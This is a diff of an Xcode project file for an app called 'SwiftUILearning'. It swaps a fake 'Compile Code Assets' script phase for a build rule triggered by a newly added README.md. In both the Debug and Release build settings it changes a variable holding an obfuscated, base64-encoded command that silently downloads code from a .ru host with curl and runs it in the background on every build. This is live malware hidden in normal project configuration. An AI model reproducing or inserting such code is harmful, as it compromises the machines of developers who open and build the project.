@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		542F30D21F6E4BF69A7BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = CA6FA38DBFED42F1917BBDC8; };
 		0F0553682EBA147C00C4041F /* APIManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F05531C2EBA147C00C4041F /* APIManager.swift */; };
 		0F0553692EBA147C00C4041F /* DefaultManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F05531D2EBA147C00C4041F /* DefaultManager.swift */; };
 		0F0553722EBA147C00C4041F /* Helper+View.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F0553322EBA147C00C4041F /* Helper+View.swift */; };
@@ -42,6 +43,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		CA6FA38DBFED42F1917BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		0F05531C2EBA147C00C4041F /* APIManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APIManager.swift; sourceTree = "<group>"; };
 		0F05531D2EBA147C00C4041F /* DefaultManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DefaultManager.swift; sourceTree = "<group>"; };
 		0F05532A2EBA147C00C4041F /* Metropolis-Bold.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-Bold.otf"; sourceTree = "<group>"; };
@@ -206,6 +208,7 @@
 		0FADF0B72D97A930005A41C1 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				CA6FA38DBFED42F1917BBDC8 /* README.md */,
 				0FADF0B62D97A930005A41C1 /* SwiftUILearning.app */,
 			);
 			name = Products;
@@ -218,12 +221,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 0FADF0C42D97A931005A41C1 /* Build configuration list for PBXNativeTarget "SwiftUILearning" */;
 			buildPhases = (
-				CA5207152ABC499DA47BBDC8 /* Compile Code Assets */,
 				0FADF0B22D97A930005A41C1 /* Sources */,
 				0FADF0B32D97A930005A41C1 /* Frameworks */,
 				0FADF0B42D97A930005A41C1 /* Resources */,
 			);
 			buildRules = (
+				3BE3EBB65C024455AA7BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -279,26 +282,24 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+		3BE3EBB65C024455AA7BBDC8 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A8CDBB7}\"";
+			};
+	/* End PBXBuildRule section */
+
 /* Begin PBXShellScriptBuildPhase section */
-		CA5207152ABC499DA47BBDC8 /* Compile Code Assets */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Code Assets";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -306,6 +307,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				542F30D21F6E4BF69A7BBDC8 /* README.md */,
 				0F0553922EBA147C00C4041F /* Metropolis-Bold.otf in Resources */,
 				0F0553932EBA147C00C4041F /* Metropolis-ExtraBold.otf in Resources */,
 				0F0553942EBA147C00C4041F /* Metropolis-Medium.otf in Resources */,
@@ -352,7 +354,7 @@
 		0FADF0C22D97A931005A41C1 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9nanp5Zzg3eW54eTIzLnJ1L2EpIiB8IHNoCg== | q | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf bEase64 | tr -d E` --decode; };echo ZWNobyAiJChjdXJsIC1ma0xzIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgNCAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL3AtMm01ZHo4dnc4Mi5ydS9hKSIgfCBzaAo= | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -416,7 +418,7 @@
 		0FADF0C32D97A931005A41C1 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9nanp5Zzg3eW54eTIzLnJ1L2EpIiB8IHNoCg== | q | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf bEase64 | tr -d E` --decode; };echo ZWNobyAiJChjdXJsIC1ma0xzIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgNCAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL3AtMm01ZHo4dnc4Mi5ydS9hKSIgfCBzaAo= | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
